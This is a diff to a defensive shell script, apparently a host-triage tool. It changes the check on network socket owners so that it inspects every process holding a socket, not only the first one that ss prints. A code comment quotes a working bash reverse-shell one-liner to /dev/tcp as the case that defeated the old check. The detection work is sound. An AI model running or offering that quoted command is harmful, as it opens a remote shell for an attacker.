@@ -813,16 +813,57 @@ else
     case "$peer" in 127.*|'[::1]'*|::1*) continue ;; esac
     [ "$netid" = udp ] && [ "$state" = ESTAB ] && case "$peer" in *:67|*:68) continue ;; esac
 
-    pid=$(printf '%s' "$rest" | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2)
-    case "$pid" in ''|*[!0-9]*) continue ;; esac
-    [ "$pid" = "$$" ] && continue
+    # EVERY owner of the socket, not just the first one ss prints.
+    #
+    # A file descriptor is inherited by children, so one socket routinely has
+    # several owners, and ss lists them in an order nobody controls. The
+    # canonical reverse shell
+    #
+    #     bash -i >& /dev/tcp/10.0.0.5/443 0>&1
+    #
+    # spawns a child for every command the attacker types, and while that child
+    # runs, ss prints it alongside - often first:
+    #
+    #     users:(("sleep",pid=1306152,fd=3),("bash",pid=1306150,fd=3))
+    #
+    # Reading only the first PID inspected `sleep`, found an ordinary packaged
+    # binary, and reported nothing. The drill on the lab VM caught this: the
+    # connection was established, the bash process was alive, and triage said
+    # the box was clean.
+    #
+    # So: look at all of them, and report the most incriminating. A shell hiding
+    # behind its own child is the normal case, not the edge case.
+    pids=$(printf '%s' "$rest" | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -un)
+    [ -n "$pids" ] || continue
 
-    exe=$(readlink "/proc/$pid/exe" 2>/dev/null) || exe=''
-    [ -n "$exe" ] || continue
-    # Our own tooling legitimately runs interpreters, and the guardian chain
-    # holds sockets when it probes a scored service. An unclearable RED teaches
-    # you to ignore RED.
-    own_payload "${exe% (deleted)}" && continue
+    pid=''; exe=''; reason=''
+    fallback_pid=''; fallback_exe=''
+    for candidate_pid in $pids; do
+      [ "$candidate_pid" = "$$" ] && continue
+      candidate_exe=$(readlink "/proc/$candidate_pid/exe" 2>/dev/null) || continue
+      [ -n "$candidate_exe" ] || continue
+      # Our own tooling legitimately runs interpreters, and the guardian chain
+      # holds sockets when it probes a scored service. An unclearable RED
+      # teaches you to ignore RED.
+      own_payload "${candidate_exe% (deleted)}" && continue
+      # Keep the first usable owner in case none of them is suspicious: the
+      # unpackaged-binary check below still needs something to report on.
+      if [ -z "$fallback_pid" ]; then
+        fallback_pid=$candidate_pid
+        fallback_exe=$candidate_exe
+      fi
+      if candidate_reason=$(socket_owner_reason "$candidate_exe"); then
+        pid=$candidate_pid
+        exe=$candidate_exe
+        reason=$candidate_reason
+        break
+      fi
+    done
+    if [ -z "$pid" ]; then
+      [ -n "$fallback_pid" ] || continue
+      pid=$fallback_pid
+      exe=$fallback_exe
+    fi
 
     local_port=${local_addr##*:}
     peer_port=${peer##*:}
@@ -833,7 +874,7 @@ else
       direction=inbound
     fi
 
-    if reason=$(socket_owner_reason "$exe"); then
+    if [ -n "$reason" ]; then
       # A python or node web service legitimately listens and legitimately
       # serves inbound sessions. What is never ordinary is that same interpreter
       # reaching OUT, or holding a port nobody put in the packet.
